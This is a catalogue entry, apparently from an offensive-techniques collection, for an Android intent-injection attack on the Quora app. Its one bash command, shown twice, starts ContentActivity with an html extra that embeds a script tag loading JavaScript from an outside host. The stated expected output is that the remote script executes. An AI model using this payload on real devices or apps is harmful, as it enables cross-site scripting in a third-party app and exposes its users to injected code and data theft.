---
data: >-
  am start -n com.quora.android/com.quora.android.ContentActivity -e url
  'http://test/test' -e html '<script src=//blackfan.ru></script>'
tags:
  - xss
  - remote-script
type: command
executor: bash
platforms:
  - Android
id: 9ed24310-a0f9-4092-9940-74b4a8099a32
created_at: '2025-12-13T23:52:44.021Z'
updated_at: '2025-12-13T23:52:44.021Z'
verified: false
validated: true
submitted: true
---
# am-start-content-external-script

## Command

```bash
am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

## Description

Launches ContentActivity with external JS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component name | Yes |
| -e url | Dummy URL | Yes |
| -e html | Script src | Yes |

## Examples

### Basic Usage

```bash
am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

## Expected Output

Remote script executes.

## Related

- [[procedures/Launch-Multiple-Quora-Activities-with-External-Script-Source]]
